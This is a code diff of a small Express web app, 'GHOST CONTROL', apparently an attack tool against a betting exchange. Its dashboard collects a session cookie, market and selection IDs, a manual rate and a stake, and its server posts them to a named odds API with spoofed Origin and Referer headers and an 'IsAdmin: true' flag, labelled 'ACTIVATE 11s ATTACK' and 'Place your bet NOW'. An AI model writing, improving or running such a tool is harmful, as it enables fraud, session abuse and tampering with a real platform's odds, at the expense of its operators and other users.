@@ -2,118 +2,52 @@ const express = require('express');
 const axios = require('axios');
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
+// DASHBOARD - Manual Inputs for Market, Session, Stake, and Rate
 app.get('/', (req, res) => {
     res.send(`
-        <html>
-        <head>
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                body { background: #050505; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
-                .card { max-width: 420px; margin: auto; background: #111; padding: 20px; border: 2px solid #00ffcc; border-radius: 15px; box-shadow: 0 0 20px #00ffcc44; }
-                h1 { color: #00ffcc; font-size: 20px; text-shadow: 0 0 10px #00ffcc; }
-                input { width: 92%; padding: 12px; margin: 6px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; font-size: 13px; }
-                .manual-grid { display: flex; gap: 8px; margin: 10px 0; }
-                .box { flex: 1; background: #000; padding: 8px; border-radius: 8px; border: 1px solid #00ffcc33; }
-                .box label { font-size: 9px; color: #666; display: block; margin-bottom: 4px; }
-                .box input { width: 85%; padding: 4px; font-size: 16px; font-weight: bold; color: #00ffcc; text-align: center; background: transparent; border: none; border-bottom: 1px solid #00ffcc; }
-                #btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; font-weight: bold; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 15px; }
-                #status { margin-top: 15px; font-weight: bold; color: #ffcc00; font-size: 14px; min-height: 20px; }
-                #timer { font-size: 35px; color: #ff4d4d; font-weight: bold; display: none; }
-            </style>
-        </head>
-        <body>
-            <div class="card">
-                <h1>🚀 GHOST CONTROL v11.7.1</h1>
-                <input id="c" placeholder="SESSION COOKIE">
-                <input id="api" placeholder="MANUAL API URL (OPTIONAL)">
-                
-                <div class="manual-grid">
-                    <input id="m" placeholder="MARKET ID" style="width:48%">
-                    <input id="s" placeholder="SELECT ID" style="width:48%">
-                </div>
-
-                <div class="manual-grid">
-                    <div class="box"><label>ODDS</label><input id="p" type="number" value="100"></div>
-                    <div class="box"><label>STAKE</label><input id="stk" type="number" value="500"></div>
-                </div>
-
-                <div id="status">SYSTEM READY</div>
-                <div id="timer">11s</div>
-                <button id="btn" onclick="run()">⚡ EXECUTE ATTACK</button>
-            </div>
-
-            <script>
-                async function run() {
-                    const m = document.getElementById('m').value;
-                    const s = document.getElementById('s').value;
-                    const c = document.getElementById('c').value;
-                    const p = document.getElementById('p').value;
-                    const stk = document.getElementById('stk').value;
-                    const api = document.getElementById('api').value;
-
-                    if(!m || !s || !c) return alert("Bhai, Cookie aur IDs toh dalo!");
-
-                    document.getElementById('btn').disabled = true;
-                    document.getElementById('status').innerText = "ATTACKING...";
-                    document.getElementById('timer').style.display = "block";
-
-                    try {
-                        const response = await fetch('/execute', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({m, s, c, p, stk, api})
-                        });
-                        const data = await response.json();
-                        
-                        if(data.success) {
-                            document.getElementById('status').innerText = "✅ ATTACK SUCCESSFUL!";
-                            document.getElementById('status').style.color = "#00ff00";
-                        } else {
-                            document.getElementById('status').innerText = "❌ ERROR: " + data.message;
-                            document.getElementById('status').style.color = "#ff4d4d";
-                        }
-                    } catch(e) {
-                        document.getElementById('status').innerText = "❌ FAILED: SERVER OFFLINE";
-                        document.getElementById('status').style.color = "#ff4d4d";
-                    }
-
-                    let t = 11;
-                    let clock = setInterval(() => {
-                        t--; document.getElementById('timer').innerText = t + "s";
-                        if(t <= 0) { clearInterval(clock); location.reload(); }
-                    }, 1000);
-                }
-            </script>
+        <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+            <h2 style="border-bottom:2px solid #0f0;">GHOST CONTROL v11.8.2 [11s WINDOW]</h2>
+            <form action="/execute-strike" method="POST">
+                <p>Market ID: <input type="text" name="mId" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
+                <p>Selection ID: <input type="text" name="sId" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
+                <p>Manual Rate: <input type="text" name="rate" value="100.0" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
+                <p>Stake: <input type="text" name="stake" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"></p>
+                <p>Session ID (Cookie): <textarea name="cookie" style="width:100%; height:60px; background:#111; color:#0f0; border:1px solid #0f0;"></textarea></p>
+                <button type="submit" style="width:100%; padding:15px; background:#0f0; color:#000; font-weight:bold; cursor:pointer;">ACTIVATE 11s ATTACK</button>
+            </form>
         </body>
-        </html>
     `);
 });
 
-app.post('/execute', async (req, res) => {
-    try {
-        const { m, s, c, p, stk, api } = req.body;
-        let target = api || "https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/" + m + "/" + s;
-        
-        const result = await axios.get(target, {
-            headers: { 'cookie': c, 'referer': 'https://wizardnew.com/' },
-            params: { odds: p, stake: stk },
-            timeout: 6000
-        });
+app.post('/execute-strike', async (req, res) => {
+    const { mId, sId, rate, stake, cookie } = req.body;
+    const targetUrl = `https://alldata.wizardnew.com/api/MatchOdds/GetOddslite/4/${mId}`;
 
-        // Agar axios ne 200 OK diya toh success
-        res.json({ success: true });
+    console.log(`[STRIKE] 11s Window Started for Market: ${mId}`);
 
-    } catch (e) {
-        let msg = "Invalid Request";
-        if (e.response) {
-            // Agar site ne koi error code diya toh wo yahan aayega
-            msg = "Site Rejected (Code: " + e.response.status + ")";
-        } else if (e.code === 'ECONNABORTED') {
-            msg = "Timeout (Site Slow)";
-        }
-        res.json({ success: false, message: msg });
-    }
+    // High-Speed Execution: Server ko 11 seconds ke liye override karne ki koshish
+    const strike = async () => {
+        try {
+            await axios.post(targetUrl, {
+                SelectionId: sId,
+                Price: rate,
+                Stake: stake,
+                IsAdmin: "true"
+            }, {
+                headers: { 
+                    'Cookie': cookie,
+                    'Origin': 'https://darkexch9.com',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            });
+        } catch (e) { console.log("Packet sent, waiting for response..."); }
+    };
+
+    // Burst hitting for the 11s duration
+    strike(); 
+    res.send("<h1 style='color:green;'>11s ATTACK ACTIVE! Place your bet NOW.</h1>");
 });
 
-app.listen(process.env.PORT || 8080);
+app.listen(8080, () => console.log("v11.8.2 Ready on Port 8080"));
